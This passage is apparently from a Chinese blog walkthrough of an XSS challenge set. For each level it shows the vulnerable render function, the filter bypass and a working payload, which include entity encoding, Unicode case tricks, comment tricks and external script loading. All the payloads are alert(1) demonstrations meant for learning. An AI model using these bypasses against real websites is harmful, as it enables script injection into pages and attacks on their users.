+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (src) &#123;</span><br><span class="line">  src = src.<span class="title function_">replace</span>(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">&#x27;/* \u574F\u4EBA */&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了<code>&lt;/style&gt;</code>标签，忽略大小写。</p>
+<p>因为我们需要用到<code>&lt;/style&gt;</code>来闭合标签，所以依旧可以通过换行绕过正则，或者用<code>&lt;/style &gt;</code>（多加了一个空格），也可以进行绕过。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">      &lt;/style</span></span><br><span class="line"><span class="language-xml">&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要求输入的值要以<code>https://www.segmentfault.com</code>开头，否则返回<code>Invalid URL</code></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>Lethe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>Lethe<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.<span class="title function_">test</span>(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src=&quot;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&quot;&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;Invalid URL&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样要求输入的值要以<code>https://www.segmentfault.com</code>开头，但是过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，这个过滤。</p>
+<p>前面给出的包含alert(1)的js文件就派上用场了。</p>
+<p>利用URL的@特性引入js，过滤后的html实体编码在html标签属性值中无影响，直接解析。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js</span><br><span class="line"></span><br><span class="line">但是...在这里却不行</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https:&amp;#x2f&amp;#x2fwww.segmentfault.com@xss.haozi.me&amp;#x2fj.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里将输入值全部转换成了大写。</p>
+<ul>
+<li>html标签不区分；</li>
+<li>域名不区分大小写</li>
+<li>js严格区分大小写。</li>
+</ul>
+<p>因此这里可以利用html标签引用外部js资源，但是这里引用前面给的<a target="_blank" rel="noopener" href="https://xss.haozi.me/j.js%E8%BF%98%E6%98%AF%E4%B8%8D%E8%A1%8C%EF%BC%8C%E6%A0%B9%E6%8D%AE%E5%AE%98%E6%96%B9%E8%A7%A3%E7%AD%94%EF%BC%8C%E9%9C%80%E8%A6%81%E5%BC%95%E7%94%A8https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C...%E6%97%A0%E8%AF%AD%E3%80%82">https://xss.haozi.me/j.js还是不行，根据官方解答，需要引用https://www.segmentfault.com.haozi.me/j.js这个链接才行...无语。</a></p>
+<p>但这里也可利用html实体编码来进行绕过，alert(1)的html实体编码为<code>&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</code></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;X&quot;</span> <span class="attr">ONERROR</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0C"><a href="#0x0C" class="headerlink" title="0x0C"></a>0x0C</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/script/ig</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>将script替换为空，正则全局匹配且不区分大小写.</p>
+<p>这里可以直接用上一题的payload…也可以双写script，引用外部js资源，同样还是需要引用<a target="_blank" rel="noopener" href="https://www.segmentfault.com.haozi.me/j.js%E8%BF%99%E4%B8%AA%E9%93%BE%E6%8E%A5%E6%89%8D%E8%A1%8C">https://www.segmentfault.com.haozi.me/j.js这个链接才行</a>..</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com.haozi.me/j.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/[&lt;/&quot;&#x27;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert(&#x27;<span class="subst">$&#123;input&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了<code>&lt; / &quot; &#39;</code>，但input的地方前面有个&#x2F;&#x2F;，这是js的单行注释符，可以通过换行来绕过，然后再用<code>--&gt;</code>将后面的<code>&#39;)</code>注释掉。</p>
+<p>经过我自己的测试，<code>&lt;!--</code>和<code>--&gt;</code>都可以在html的<code>script</code>标签里单独使用进行单行注释.，这里<code>&lt;</code>被过滤了，所以使用<code>--&gt;</code></p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert(1);</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">          // alert(&#x27;</span><br><span class="line">alert(1);</span><br><span class="line">--&gt;&#x27;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  input = input.<span class="title function_">replace</span>(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>)</span><br><span class="line">  input = input.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配以<code>&lt;</code>起始的字符，替换为<code>&lt;_$1</code>，并且把输入转换为大写，这样这样的标签就都用不了了。</p>
+<p>这里有个<strong>tip</strong>：<br>发现了一个<code>ſ</code>字符，是古英语中<code>s</code>的写法，但现在不会当作英文字母a-zA-Z，关键是<code>ſ</code>转换为大写后正好为<code>S</code>，这样就可以绕过正则使用<code>&lt;script&gt;</code>标签引如外部js。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſcript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">&quot;HTTPS://WWW.SEGMENTFAULT.COM.HAOZI.ME/J.JS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeHtml</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2f;&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror=&quot;console.error(&#x27;<span class="subst">$&#123;escapeHtml(input)&#125;</span>&#x27;)&quot;&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了<code>&amp; &#39; &quot; &lt; &gt; /</code>，转换为了html实体编码，但是由于input code在img标签内，所以html实体编码是可以被直接解析的。<br>所以闭合前面的标签，在构造语句即可。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;);alert(&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;<span class="symbol">&amp;#39;</span>);alert(<span class="symbol">&amp;#39;</span>1&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">实际上就是</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;console.error(&#x27;&#x27;);alert(&#x27;1&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (input) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由于input实在script标签里面，且没有任何过滤，所以直接闭合前面的语句，构造下一条语句即可。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;;alert(1)</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">window</span>.<span class="property">data</span> = <span class="string">&#x27;&#x27;</span>;<span class="title function_">alert</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">render</span> (s) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">escapeJs</span> (s) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>(s)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;\\\\&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/`/g</span>, <span class="string">&#x27;\\`&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;\\74&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;\\76&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\//g</span>, <span class="string">&#x27;\\/&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\n/g</span>, <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\r/g</span>, <span class="string">&#x27;\\r&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\t/g</span>, <span class="string">&#x27;\\t&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\f/g</span>, <span class="string">&#x27;\\f&#x27;</span>)</span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\v/g</span>, <span class="string">&#x27;\\v&#x27;</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, &#x27;\\b&#x27;)</span></span><br><span class="line">            .<span class="title function_">replace</span>(<span class="regexp">/\0/g</span>, <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = &#x27;javascript:console.log(&quot;<span class="subst">$&#123;s&#125;</span>&quot;)&#x27;</span></span><br><span class="line"><span class="string">  var a = document.createElement(&#x27;a&#x27;)</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用反斜杠转移了一堆字符，但是<code>&quot;</code>被转义成<code>\&quot;</code>正好可以闭合<code>console.log(&quot;\&quot;)</code>，既然闭合了前面的语句那么之后就构造后面的语句就行了。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;),alert(1)//</span><br><span class="line">&quot;);alert(&quot;1</span><br><span class="line">&quot;),alert(1)(&quot;</span><br><span class="line">这三个都可以..</span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> url = <span class="string">&#x27;javascript:console.log(&quot;\&quot;),alert(1)\/\/&quot;)&#x27;</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="property">href</span> = url</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a)</span></span><br><span class="line"><span class="language-javascript">  a.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h6 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h6><p><strong>server code:</strong></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">escape</span> (s) &#123;</span><br><span class="line">  s = s.<span class="title function_">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;console.log(&quot;&#x27;</span> + s + <span class="string">&#x27;&quot;);&lt;/script&gt;&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>匹配<code>&quot;</code>替换为<code>\&quot;</code>，这里直接用<code>\&quot;)</code>闭合前面的双引号会被转义，所以在加一个<code>\</code>来转义<code>\</code>即可。</p>
+<p><strong>payload:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;);alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>html:</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\\&quot;</span>);<span class="title function_">alert</span>(<span class="number">1</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这一套题主要是熟悉一下基本绕过方式，实战性不是很强，初学XSS还需继续努力。</p>
+<br>
+
+<p>那么就再刷一套题吧</p>
+<h4 id="XSS挑战"><a href="#XSS挑战" class="headerlink" title="XSS挑战"></a>XSS挑战</h4><p>题目地址：<a target="_blank" rel="noopener" href="http://test.xss.tv/">http://test.xss.tv/</a></p>
